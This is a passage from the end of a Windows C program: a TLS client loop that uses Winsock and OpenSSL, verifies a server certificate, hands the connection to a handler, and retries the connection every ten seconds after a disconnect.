            closesocket(sock);
            SSL_free(ssl);
            continue;
        }

        // Verify server certificate
        verify_server_certificate(ssl);



        // Handle communication with the server
        handle_server(sock, ssl, buffer);

        // If server disconnects, clean up and retry connection
        closesocket(sock);
        SSL_shutdown(ssl);
        SSL_free(ssl);
        printf("[INFO] Disconnected from server. Retrying connection in 10 seconds...\n");
        Sleep(10000);  // Wait before retrying
    }

    // Clean up Winsock and OpenSSL (never reached in the current infinite loop)
    WSACleanup();
    cleanup_openssl();
    return 0;
}